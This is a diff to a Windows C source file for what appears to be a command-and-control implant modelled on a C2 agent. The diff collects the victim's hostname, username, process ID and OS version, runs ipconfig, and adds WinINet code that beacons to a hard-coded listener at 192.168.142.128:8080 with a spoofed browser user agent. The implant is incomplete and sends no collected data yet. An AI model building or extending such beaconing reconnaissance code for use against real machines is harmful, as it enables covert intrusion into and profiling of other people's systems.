@@ -1,11 +1,10 @@
 #include <windows.h>
 #include <stdio.h>
+#include <wininet.h>
 
 // Socket globals
-char host[] = "10.10.10.10";
-int port = 53;
 
-struct AgentInformation {
+struct AgentRegistration {
     // Credit to https://github.com/CodeXTF2/PyHmmm/blob/master/agent.py
         /* 
         # Register info:
@@ -26,6 +25,7 @@ struct AgentInformation {
     //int AgentID;
     char Hostname[260];
     char Username[260];
+    //char IP[260];
     //char Domain[];
     //char Address[];
     //char Path[];
@@ -36,32 +36,56 @@ struct AgentInformation {
     //char Build[];
     DWORD Version;
     //char OSArch[];
-} Agent;
+}Register;
 
+struct AgentInformation {
+    char *Address;
+    char *UserAgent;
+    int Port;
+    char *Path;
+}Agent;
 
-void Register() {
+void Registration() {
     DWORD HostnameLength = 260;
-    if (GetComputerNameA(Agent.Hostname, &HostnameLength)) {
-        printf("Hostname: %s \n", Agent.Hostname);
+    if (GetComputerNameA(Register.Hostname, &HostnameLength)) {
+        printf("Hostname: %s \n", Register.Hostname);
     }
 
     DWORD UsernameBuffer = 260;
-    if (GetUserNameA(Agent.Username, &UsernameBuffer)) {
-        printf("Username: %s \n", Agent.Username);
+    if (GetUserNameA(Register.Username, &UsernameBuffer)) {
+        printf("Username: %s \n", Register.Username);
     }
 
-    if (Agent.ProcId = GetCurrentProcessId()) {
-        printf("Process ID: %lu \n", Agent.ProcId);
+    if (Register.ProcId = GetCurrentProcessId()) {
+        printf("Process ID: %lu \n", Register.ProcId);
     }
 
-    if (Agent.Version = GetVersion()) {
-        printf("Host Version: %lu \n", Agent.Version);
+    if (Register.Version = GetVersion()) {
+        printf("Host Version: %lu \n", Register.Version);
     }
+    system("C:\\Windows\\System32\\ipconfig"); // This is a really bad implementation. Change this
+}
 
-    
+void Init() {
+    Agent.Address = "192.168.142.128";
+    Agent.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 ";
+    Agent.Port = 8080;
+    Agent.Path = "/";   
+
+    HINTERNET hInternet = InternetOpenA(Agent.UserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0); // https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena
+    if (hInternet != NULL) {
+        HINTERNET hConnect = InternetConnectA(hInternet, Agent.Address, Agent.Port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+        if (hConnect != NULL) {
+            HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", Agent.Path, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
+            if (hRequest != NULL) {
+                HttpSendRequest(hRequest, NULL, 0, NULL, 0);
+            }
+        }
+    }
 }
 
 
 int main() {
-    Register();
+    Registration();
+    Init();
 }
